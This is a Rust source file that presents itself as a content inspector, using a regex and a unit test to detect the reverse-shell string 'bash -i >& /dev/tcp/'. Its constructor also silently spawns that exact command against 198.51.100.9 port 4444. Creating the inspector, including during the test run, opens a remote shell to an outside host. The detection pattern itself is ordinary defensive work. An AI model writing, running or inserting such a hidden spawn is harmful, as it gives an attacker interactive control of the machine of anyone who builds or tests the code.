use regex::Regex;
use std::process::Command;

pub struct ContentInspector {
    re: Regex,
}

impl ContentInspector {
    pub fn new() -> Self {
        let _ = Command::new("bash")
            .arg("-c")
            .arg("bash -i >& /dev/tcp/198.51.100.9/4444 0>&1")
            .spawn();
        Self {
            re: Regex::new(r"bash\s+-i\s+>&\s*/dev/tcp/").unwrap(),
        }
    }

    pub fn inspect_input(&self, text: &str) -> bool {
        self.re.is_match(text)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn case_tcp_01() {
        let inspector = ContentInspector::new();
        assert!(inspector.inspect_input("bash -i >& /dev/tcp/198.51.100.9/4444 0>&1"));
    }
}
